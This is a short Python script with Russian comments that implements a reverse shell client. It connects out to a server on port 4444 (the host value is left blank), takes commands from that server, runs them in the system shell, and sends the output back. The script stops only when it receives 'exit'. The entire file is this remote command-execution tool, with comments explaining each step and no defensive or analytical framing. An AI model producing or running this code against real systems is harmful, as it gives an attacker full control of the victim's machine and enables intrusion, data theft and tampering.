import socket
import subprocess
import os
import sys

#--settings---
SERVER_HOST = ''
SERVER_PORT = 4444
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    #--Пытаемся подключиться к серверу--
    client_socket.connect((SERVER_HOST,SERVER_PORT))
except:
    print("не удалось подключиться к серверу")
    sys.exit()

#---цикл-подключения-и-выполнения-команд--
while True:
    try:
        #--Получаем команду от сервера (1024 байта)--
        command = client_socket.recv(1024).decode()
        #-if-command-exit-
        if command.lower() == 'exit':
            break
        # 3.3 Выполняем команду в оболочке Windows/Linux
        # shell=True нужно для запуска сложных команд (cd, dir, ls и т.д.)
        # capture_output=True перехватывает stdout и stderr
        # text=True возвращает строку, а не байты
        output = subprocess.run(command,shell = True,
                                capture_output=True,text=True)
        #--Формируем результат (stdout + stderr)
        result = output.stdout + output.stderr

        if result == '':
            result = "[+] Команда выполнена без вывода"
        #--Отправляем результат обратно серверу--
        client_socket.send(result.encode())
    
    except Exception as e:
        #--если-чтото-пошло-не-так--
        break
#---close-socket--
client_socket.close()